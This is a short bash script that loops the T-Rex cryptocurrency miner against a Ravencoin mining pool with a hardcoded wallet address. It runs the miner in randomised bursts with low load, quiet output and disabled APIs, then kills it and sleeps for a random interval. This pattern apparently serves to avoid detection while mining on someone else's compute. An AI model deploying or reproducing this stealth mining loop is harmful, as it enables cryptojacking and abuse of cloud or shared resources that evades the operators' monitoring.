while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%120))
	b=600
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=140
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./t-rex -a kawpow -o stratum+ssl://eu.ravenminer.com:13802 -u RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.trex -p pps  --low-load 1 --intensity 12 --api-bind-telnet 0 --api-bind-http 0 -q
 	timeout -k 5 2s pgrep t-rex | xargs kill
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
